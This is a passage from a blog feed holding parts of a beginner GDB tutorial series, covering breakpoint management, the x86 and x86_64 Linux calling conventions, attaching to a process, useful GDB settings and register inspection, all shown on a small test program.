<p>If you have finished debugging at one of the breakpoints, you can delete them via the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> delete breakpoints <span style="color:#f92672">[</span>Breakpoint Number<span style="color:#f92672">]</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Deleting Breakpoints - Syntax<br><br></span>
<p>If you need to delete more than one breakpoint, here are some other examples:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># If no number is specified, it will delete all breakpoints</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> delete breakpoints 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Delete breakpoints 2, 4 and 6</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> delete breakpoints <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">6</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Delete breakpoints 1 to 6</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> delete breakpoints 1-6
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Deleting Breakpoints - Examples<br><br></span>
<h3 id="25-disabling--enabling-breakpoints">2.5 Disabling / Enabling Breakpoints</h3>
<p>Depending on the situation, you may also want to consider disabling and re-enabling certain breakpoints.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disable breakpoints <span style="color:#f92672">[</span>Breakpoint Number<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> enable breakpoints <span style="color:#f92672">[</span>Breakpoint Number<span style="color:#f92672">]</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Disabling/Enabling Breakpoints - Syntax<br><br></span>
<p>If you need to disable / enable more than one breakpoint, you can follow the syntax in <a href="/posts/gdb-guides/gdb-guide-part2-breakpoints-and-linux-calling-conventions/#24-deleting-breakpoints">Section 2.4</a></p>
<h3 id="26-conditional-breakpoints">2.6 Conditional Breakpoints</h3>
<p>At times you will find that your breakpoint keeps getting triggered by random sources and is generating too much noise.
In that case, you may consider adding a <code>condition</code> clause to the breakpoint.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> condition <span style="color:#f92672">[</span>Breakpoint Number<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>....<span style="color:#f92672">]</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Setting Conditions to Breakpoints - Syntax<br><br></span>
<p>The example below demonstrates how to set a conditional breakpoint to <em>func_1()</em>, such that this breakpoint only triggers if <code>valueAt(EBP + 0xC) == 0xD</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> b func_1
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> condition <span style="color:#ae81ff">1</span> <span style="color:#f92672">{</span>unsigned long<span style="color:#f92672">}(</span>$ebp+0xc<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> 0xd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Alternatively</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> condition <span style="color:#ae81ff">1</span> *<span style="color:#f92672">(</span>unsigned long *<span style="color:#f92672">)(</span>$ebp+0xc<span style="color:#f92672">)</span> <span style="color:#f92672">==</span> 0xd
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Setting Conditional Breakpoint - Example<br><br></span>
<h2 id="3-linux-calling-conventions">3. Linux Calling Conventions</h2>
<p>Depending on the architecture, the way registers are &ldquo;loaded&rdquo; in memory will be different.
Bear in mind that this section will not cover ARM. Perhaps in the future, I will do a separate post about it. For now, we will keep things simple and stick to x86(32 bit) and x86_64(64 bit) architectures.</p>
<h3 id="31-32-bit---x86">3.1 32 Bit - x86</h3>
<p>You can read the full details <a href="https://en.wikipedia.org/wiki/X86_calling_conventions">here</a>, but if you just want the gist of it, the following diagram summarizes the x86 calling convention.</p>
<img class="center" alt="epb-structure" src="/posts/gdb-guides/gdb-guide-part2-breakpoints-and-linux-calling-conventions/images/x86_calling_convention.png">
<br>
<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="figure">x86 Stack Frame<br><br></span>
<p>Following the above diagram as an example, if we have a function that takes in 3 parameters, the 3rd parameter will get pushed onto the stack first, followed by the 2nd then the 1st. 4 bytes after the address of EBP, it contains the return address after the function call.</p>
<p>Unlike 64 bit binaries, <strong>addresses are only stored as a 4-byte value</strong>.</p>
<p>We can actually test this out by compiling our <a href="/posts/gdb-guides/gdb-guide-part1-basics/resources/test.c">test.c</a> program shown previously in part 1 of the tutorial, as a 32 bit ELF binary.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc -m32 test.c -o test32
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Compiling 32-Bit Binary<br><br></span>
<p>To practice what we have learned earlier, let us set a breakpoint on <em>func_2()</em> and print out its parameters and return address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Set the GDB configuration</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set pagination off
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set confirm off
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set output-radix <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set disassembly-flavor intel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set breakpoint at func_2 and continue</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> b func_2
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># In the process, select option 2 to trigger the breakpoint</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## We know that param 1 is a char *.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## and param_2 is an unsigned long.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set $param_1 <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>char *<span style="color:#f92672">}(</span>$ebp + 0x8<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set $param_2 <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>unsigned long<span style="color:#f92672">}(</span>$ebp + 0xc<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set $return_addr <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>unsigned long<span style="color:#f92672">}(</span>$ebp + 0x4<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> p <span style="color:#f92672">(</span>char *<span style="color:#f92672">)</span>$param_1
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> p <span style="color:#f92672">(</span>unsigned long<span style="color:#f92672">)</span>$param_2
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> p <span style="color:#f92672">(</span>void *<span style="color:#f92672">)</span>$return_addr
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Printing Parameters of <em>func_2()</em> - x86<br><br></span>
<p>
 
<video width=100% controls>
    <source src="/posts/gdb-guides/gdb-guide-part2-breakpoints-and-linux-calling-conventions/videos/x86-calling-convention-example.webm" type="video/webm">
    Your browser does not support the video tag.  
</video>

<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="video">Demonstrating x86 Calling Convention<br><br></span></p>
<h3 id="32-64-bit---x86_64">3.2 64 Bit - x86_64</h3>
<p>The <a href="http://6.s081.scripts.mit.edu/sp18/x86-64-architecture-guide.html#:~:text=Calling%20Convention&amp;text=The%20caller%20uses%20registers%20to,off%20the%20stack%20in%20order.">MIT documentation</a> on 64-bit Linux does get straight to the point but lack concrete examples. Instead, I found out this other <a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame">blog post</a>
talking about it and found it a lot more comprehensible. You could give it a read if you have the time.</p>
<p>For those of you who just want the TLDR, refer to the diagram below.</p>
<img class="center" alt="epb-structure" src="/posts/gdb-guides/gdb-guide-part2-breakpoints-and-linux-calling-conventions/images/x86_64_calling_convention.png">
<br>
<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="figure">x86_64 Stack Frame<br><br></span>
<p>At the start of the function, the following parameters will be stored in its respective registers:</p>
<ol>
<li><code>RDI</code> &mdash; Param 1</li>
<li><code>RSI</code> &mdash; Param 2</li>
<li><code>RDX</code> &mdash; Param 3</li>
<li><code>RCX</code> &mdash; Param 4</li>
<li><code>R8</code> &mdash; Param 5</li>
<li><code>R9</code> &mdash; Param 6</li>
</ol>
<p>This is followed by a set of instructions to push the values stored in <code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8</code> and <code>R9</code> onto the stack sequentially.</p>
<p>The example below shows a possible set of instructions near the start of <em>test_func()</em> that takes in 6 parameters.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disass test_func
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> test_func:
</span></span><span style="display:flex;"><span>   0x00005988a0e0c1c9 &lt;+0&gt;:     endbr64 
</span></span><span style="display:flex;"><span>   0x00005988a0e0c1cd &lt;+4&gt;:     push   rbp
</span></span><span style="display:flex;"><span>   0x00005988a0e0c1ce &lt;+5&gt;:     mov    rbp,rsp
</span></span><span style="display:flex;"><span>   0x00005988a0e0c1d1 &lt;+8&gt;:     sub    rsp,0x20
</span></span><span style="display:flex;"><span>   0x00005988a0e0c1d5 &lt;+12&gt;:    mov    QWORD PTR <span style="color:#f92672">[</span>rbp-0x8<span style="color:#f92672">]</span>,rdi
</span></span><span style="display:flex;"><span>   0x00005988a0e0c1d9 &lt;+16&gt;:    mov    QWORD PTR <span style="color:#f92672">[</span>rbp-0x10<span style="color:#f92672">]</span>,rsi
</span></span><span style="display:flex;"><span>   0x00005988a0e0c1dd &lt;+20&gt;:    mov    DWORD PTR <span style="color:#f92672">[</span>rbp-0x14<span style="color:#f92672">]</span>,edx
</span></span><span style="display:flex;"><span>   0x00005988a0e0c1e0 &lt;+23&gt;:    mov    DWORD PTR <span style="color:#f92672">[</span>rbp-0x18<span style="color:#f92672">]</span>,ecx
</span></span><span style="display:flex;"><span>   0x00005988a0e0c1e3 &lt;+26&gt;:    mov    DWORD PTR <span style="color:#f92672">[</span>rbp-0x1c<span style="color:#f92672">]</span>,r8d
</span></span><span style="display:flex;"><span>   0x00005988a0e0c1e7 &lt;+30&gt;:    mov    DWORD PTR <span style="color:#f92672">[</span>rbp-0x20<span style="color:#f92672">]</span>,r9d
</span></span><span style="display:flex;"><span>   0x00005988a0e0c1eb &lt;+34&gt;:    mov    rax,QWORD PTR <span style="color:#f92672">[</span>rbp-0x8<span style="color:#f92672">]</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">x86_64 Instruction Set at Start of test_func()<br><br></span>
<p>Upon entry into <em>test_func()</em>, RIP is at <code>&lt;test_func+0&gt;</code>. At this point, all the parameter values are still stored in the 6 registers.
However, when the RIP is at <code>&lt;test_func+34&gt;</code>, the Stack Frame will be similar to the one shown in Figure 2.</p>
<p>Enough talking and let&rsquo;s get to work!</p>
<p>Similar to the GDB exercise shown in <a href="/posts/gdb-guides/gdb-guide-part2-breakpoints-and-linux-calling-conventions/#31-32-bit---x86">Section 3.1</a>, we will do the same here for a 64-bit binary. In case you haven&rsquo;t compiled already, please run the following command to compile a 64-bit ELF binary:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc test.c -o test
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Compiling a x86_64 Test Binary<br><br></span>
<p>Again, we shall do the same to set a breakpoint on <em>func_2()</em> and print out its parameters and return address.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Set the GDB configuration</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set pagination off
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set confirm off
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set output-radix <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set disassembly-flavor intel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set breakpoint at func_2 and continue</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> b func_2
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># In the process, select option 2 to trigger the breakpoint</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## We know that param 1 is a char *.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## and param_2 is an unsigned long.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set $param_1 <span style="color:#f92672">=</span> $rdi
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set $param_2 <span style="color:#f92672">=</span> $rsi
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> set $return_addr <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>unsigned long long<span style="color:#f92672">}(</span>$rbp + 0x8<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> p <span style="color:#f92672">(</span>char *<span style="color:#f92672">)</span>$param_1
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> p <span style="color:#f92672">(</span>unsigned long<span style="color:#f92672">)</span>$param_2
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> p <span style="color:#f92672">(</span>void *<span style="color:#f92672">)</span>$return_addr
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Printing Parameters of <em>func_2()</em> - x86_64<br><br></span>
<p>
 
<video width=100% controls>
    <source src="/posts/gdb-guides/gdb-guide-part2-breakpoints-and-linux-calling-conventions/videos/x86-64-calling-convention-example.webm" type="video/webm">
    Your browser does not support the video tag.  
</video>

<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="video">Demonstrating x86_64 Calling Convention<br><br></span></p>
<h2 id="4-conclusion">4. Conclusion</h2>
<p>Good job making it this far! There won&rsquo;t be any more new posts for a while from now as Chinese New Year is around the corner.</p>
<p>Until then, keep practicing and stay awesome!</p>
<h2 id="5-references">5. References</h2>
<ol>
<li><a href="https://en.wikipedia.org/wiki/X86_calling_conventions">x86 Calling Convention</a></li>
<li><a href="http://6.s081.scripts.mit.edu/sp18/x86-64-architecture-guide.html">MIT x86-64 Architecture Guide</a></li>
<li><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame">IRed Team Blog - Linux x64 Calling Convention Stack Frame</a></li>
</ol>
<h2 id="6-resources">6. Resources</h2>
<ol>
<li><a href="/posts/gdb-guides/gdb-guide-part1-basics/resources/test.c">test.c</a></li>
</ol>
]]></content>
        </item>
        
        <item>
            <title>GDB Guide Part 1 - Basics</title>
            <link>https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part1-basics/</link>
            <pubDate>Sun, 19 Jan 2025 10:37:22 +0800</pubDate>
            
            <guid>https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part1-basics/</guid>
            <description>&lt;h2 id=&#34;1-introduction&#34;&gt;1. Introduction&lt;/h2&gt;
&lt;p&gt;Part 1 of this series is meant as an introduction to GDB for beginners. As I progress through this series, I will be sharing more advanced tips and even provide a nice template in writing your own custom GDB commands using python!&lt;/p&gt;
&lt;h2 id=&#34;2-overview&#34;&gt;2. Overview&lt;/h2&gt;
&lt;p&gt;Today&amp;rsquo;s guide will show you how to:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Attach to a Process&lt;/li&gt;
&lt;li&gt;Set useful GDB Configuration&lt;/li&gt;
&lt;li&gt;Inspect Registers&lt;/li&gt;
&lt;li&gt;Disassemble Functions&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;I will be providing an example C file &lt;a href=&#34;https://mathscantor.github.io/posts/gdb-guides/gdb-guide-part1-basics/resources/test.c&#34;&gt;here&lt;/a&gt; for you to compile so that you may follow the walkthrough and deepen your understanding.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="1-introduction">1. Introduction</h2>
<p>Part 1 of this series is meant as an introduction to GDB for beginners. As I progress through this series, I will be sharing more advanced tips and even provide a nice template in writing your own custom GDB commands using python!</p>
<h2 id="2-overview">2. Overview</h2>
<p>Today&rsquo;s guide will show you how to:</p>
<ol>
<li>Attach to a Process</li>
<li>Set useful GDB Configuration</li>
<li>Inspect Registers</li>
<li>Disassemble Functions</li>
</ol>
<p>I will be providing an example C file <a href="/posts/gdb-guides/gdb-guide-part1-basics/resources/test.c">here</a> for you to compile so that you may follow the walkthrough and deepen your understanding.</p>
<p>To compile test.c:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gcc test.c -o test
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Compiling Test Program<br><br></span>
<h2 id="3-attaching-to-a-process">3. Attaching to a Process</h2>
<p>There are two ways to go about doing this. The first which is the simplest, is to run GDB with the binary path as its parameter.
The second way to do this is to attach to an already running process via its PID.</p>
<h3 id="31-via-binary">3.1 Via Binary</h3>
<p>If you have chosen this method, it means that you know the binary full path and also the parameters to run the binary.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb $BINARY_PATH
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Attaching before Process Begins<br><br></span>
<p>Afterwards, run the binary with its parameters.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> r $param1 $param2 ....
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Running with Parameters<br><br></span>
<h3 id="32-via-pid">3.2 Via PID</h3>
<p>Alternatively, you can also attach to a running process via its PID in several ways as well.</p>
<ol>
<li>
<p>You can start either GDB first, then do <code>attach $PID</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> attach $pid
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Attaching via PID - Method 1<br><br></span>
</li>
<li>
<p>OR, you can start GDB with the <code>-p</code> parameter.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ gdb -p <span style="color:#e6db74">`</span>pidof $PROC_NAME<span style="color:#e6db74">`</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Attaching via PID - Method 2<br><br></span>
</li>
</ol>
<h3 id="33-test-example">3.3 Test Example</h3>
<p>I have created a video for those who are more visual learners, using a compiled test.c as an example for GDB to attach to.</p>
<p>
 
<video width=100% controls>
    <source src="/posts/gdb-guides/gdb-guide-part1-basics/videos/attach-to-process.webm" type="video/webm">
    Your browser does not support the video tag.  
</video>

<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="video">Attaching to Test Program - Short Demo<br><br></span></p>
<h2 id="4-useful-gdb-configurations">4. Useful GDB Configurations</h2>
<p>I would recommend the following configurations right from the get-go when doing dynamic analysis.</p>
<ol>
<li>
<p><code>set pagination off</code></p>
<ul>
<li>By default, this is set to &ldquo;on&rdquo; and it is really annoying when you are dealing with large outputs, prompting you to press <code>Enter</code> in order to continue.</li>
</ul>
</li>
<li>
<p><code>set logging enabled on</code></p>
<ul>
<li>By default, this is set to &ldquo;off&rdquo;. This is very useful especially when you want to look back at the commands you ran and the outputs you had. If the file path is not stated, it will be written to gdb.txt. See <a href="https://sourceware.org/gdb/current/onlinedocs/gdb.html/Logging-Output.html">here</a> for more information on GDB logging.</li>
</ul>
</li>
<li>
<p><code>set confirm off</code></p>
<ul>
<li>By default, this is set to &ldquo;on&rdquo; as GDB is very cautious. When automating dynamic analysis with a GDB script, this will break your automation. I will recommend turning this off only when you need to automate things.</li>
</ul>
</li>
<li>
<p><code>set print pretty on</code></p>
<ul>
<li>By default, this is set to &ldquo;off&rdquo;. This is more of a personal preference for me. This is more for you to decide whether you want your structure to be printed in one line or in a more readable form.
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># set print pretty on</span>
</span></span><span style="display:flex;"><span>$1 <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>next <span style="color:#f92672">=</span> 0x0,
</span></span><span style="display:flex;"><span>flags <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    sweet <span style="color:#f92672">=</span> 1,
</span></span><span style="display:flex;"><span>    sour <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>,
</span></span><span style="display:flex;"><span>meat <span style="color:#f92672">=</span> 0x54 <span style="color:#e6db74">&#34;Pork&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># set print pretty off</span>
</span></span><span style="display:flex;"><span>$1 <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>next <span style="color:#f92672">=</span> 0x0, flags <span style="color:#f92672">=</span> <span style="color:#f92672">{</span>sweet <span style="color:#f92672">=</span> 1, sour <span style="color:#f92672">=</span> 1<span style="color:#f92672">}</span>, meat <span style="color:#f92672">=</span> 0x54 <span style="color:#e6db74">&#34;Pork&#34;</span><span style="color:#f92672">}</span>
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">Pretty Print On/Off<br><br></span></li>
</ul>
</li>
<li>
<p><code>set output-radix 16</code></p>
<ul>
<li>By default, output-radix is set to 10. This would print out numbers in GDB as hexadecimal. I&rsquo;m hard-wired to read hexadecimals when debugging stuff, so this is a must for me.</li>
</ul>
</li>
<li>
<p><code>set disassembly-flavor intel</code></p>
<ul>
<li>By default disassembly-flavor is set to &ldquo;att&rdquo;. However, I prefer the &ldquo;intel&rdquo; style disassembly despite specializing in Linux exploitation 🤡.</li>
</ul>
</li>
<li>
<p><code>set print elements 0</code></p>
<ul>
<li>By default, the limit is set to 200 characters. I will usually set this to 0 which means that printing is unlimited. This is especially useful whenever you are trying to print a very large string from memory.</li>
</ul>
</li>
</ol>
<h2 id="5-inspecting-registers">5. Inspecting Registers</h2>
<p>There are actually several ways to print the values of the registers.</p>
<h3 id="51-via-info-registers">5.1 Via <code>info registers</code></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Prints all registers&#39; values</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info registers
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Print only rax value</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info registers rax
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Print an array of registers</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info registers rdi rsi rdx rcx 
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">GDB command - info registers<br><br></span>
<h3 id="52-via-print--printf">5.2 Via <code>print</code> / <code>printf</code></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Print rax value</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> print $rax
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Printf rax value</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> printf <span style="color:#e6db74">&#34;rax = %d\n&#34;</span>, $rax
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Printf rdi, rsi, rdx, rcx</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> printf <span style="color:#e6db74">&#34;rdi = %d\nrsi = %d\nrdx = %d\nrcx = %d\n&#34;</span>, $rdi, $rsi, $rdx, $rcx
</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="listing">GDB command - print / printf<br><br></span>
<h3 id="53-test-example">5.3 Test Example</h3>
<p>
 
<video width=100% controls>
    <source src="/posts/gdb-guides/gdb-guide-part1-basics/videos/get-register-info.webm" type="video/webm">
    Your browser does not support the video tag.  
</video>

<link href="/posts/css/caption.css" rel="stylesheet">
<span class="caption" data-type="video">Showing Registers&rsquo; Values - Short Demo<br><br></span></p>
<h2 id="6-looking-at-disassembly">6. Looking at Disassembly</h2>
<p>Looking at disassembly provides us more information such as offsets and instruction sets.
